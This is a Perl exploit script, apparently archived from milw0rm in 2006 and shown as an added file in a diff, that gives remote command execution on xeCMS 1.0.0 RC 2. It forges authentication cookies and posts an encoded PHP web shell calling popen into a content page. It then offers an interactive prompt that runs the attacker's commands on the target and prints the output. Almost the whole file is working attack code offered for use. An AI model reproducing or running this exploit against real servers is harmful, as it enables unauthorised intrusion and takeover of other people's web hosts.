@@ -1,0 +1,94 @@
+#!/usr/bin/perl
+#
+# xeCMS 1.0.0 RC 2 Remote Command Execution Exploit
+#
+# Copyright (c) 2006 cijfer <cijfer@netti!fi>
+# All rights reserved.
+#
+# never ctrl+c again.
+# cijfer$ http://target.com/dir
+# host changed to 'http://target.com/dir'
+# cijfer$ 
+#
+# greets to JagX
+#
+# $Id: cijfer-xecmsxpl.pl,v 0.1 2006/01/29 22:13:00 cijfer Exp $
+
+use LWP::UserAgent;
+use URI::Escape;
+use Getopt::Long;
+use Term::ANSIColor;
+use HTTP::Cookies;
+
+$res  = GetOptions("host=s" => \$host, "proxy=s" => \$proxy, "verbose+" => \$verbose);
+&usage unless $host;
+
+while()
+{
+	print color("green"), "cijfer\$ ", color("reset");
+	chomp($command = <STDIN>);
+	exit unless $command;
+	if($command =~ m/^http:\/\/(.*)/g)
+	{
+		$host="http://".$1;
+		print "host changed to '";
+		print color("bold"), $host."'\n", color("reset");
+	}
+	&exploit($command,$host);
+}
+
+sub usage
+{
+	print "xeCMS 1.0.0 RC 2 Remote Command Execution Exploit\n";
+	print "usage: $0 -hpv\n\n";
+	print "  -h --host\tfull address of target (ex. http://www.website.com/directory)\n";
+	print "  -p --proxy\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
+	print "  -v --verbose\tverbose mode\n\n";
+	exit;
+}
+
+sub exploit
+{
+	my($command,$host) = @_;
+
+	$cookie_h=$host;
+	$cookie_h=~s/http:\/\/(.*?)\/.*/$1/;
+
+	$cij=LWP::UserAgent->new() or die;
+	$cij->agent("Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101");
+	$cij->proxy("http", "http://".$tunnel."/") unless !$proxy;
+	$cij->cookie_jar(HTTP::Cookies->new());
+	$cij->cookie_jar->set_cookie("1","xecms_username","cijfer","/",$cookie_h,,,,,);
+	$cij->cookie_jar->set_cookie("1","xecms_password","cijfer","/",$cookie_h,,,,,);
+
+	$string  = "%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B";
+	$string .= uri_escape(shift);
+	$string .= "%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F";
+	$execut  = "%3C%3F%24%68%61%6E%64%6C%65%3D%70%6F%70%65%6E";
+	$execut .= "%28%24%5F%47%45%54%5B%63%69%6A%5D%2C%22%72%22";
+	$execut .= "%29%3B%77%68%69%6C%65%28%21%66%65%6F%66%28%24";
+	$execut .= "%68%61%6E%64%6C%65%29%29%7B%24%6C%69%6E%65%3D";
+	$execut .= "%66%67%65%74%73%28%24%68%61%6E%64%6C%65%29%3B";
+	$execut .= "%69%66%28%73%74%72%6C%65%6E%28%24%6C%69%6E%65";
+	$execut .= "%29%3E%3D%31%29%7B%65%63%68%6F%22%24%6C%69%6E";
+	$execut .= "%65%22%3B%7D%7D%70%63%6C%6F%73%65%28%24%68%61";
+	$execut .= "%6E%64%6C%65%29%3B%3F%3E";
+
+	$out=$cij->post($host."/index.php?a=add&submit=1",['autobr'=>'no', 'content'=>uri_unescape($execut), 'id'=>'cijfer', 'id_nav'=>'cijfer'],);
+	$out=$cij->get($host."/index.php?p=cijfer&cij=".$string);
+
+	if($out->is_success)
+	{
+		@cij=split("_cijfer_",$out->content);
+		print substr(@cij[1],1);
+	}
+	if($verbose)
+	{
+		$recv=length $out->content;
+		print "Total received bytes: ".$recv."\n";
+		$sent=length $command;
+		print "Total sent bytes: ".$sent."\n";
+	}
+}
+
+# milw0rm.com [2006-01-30]
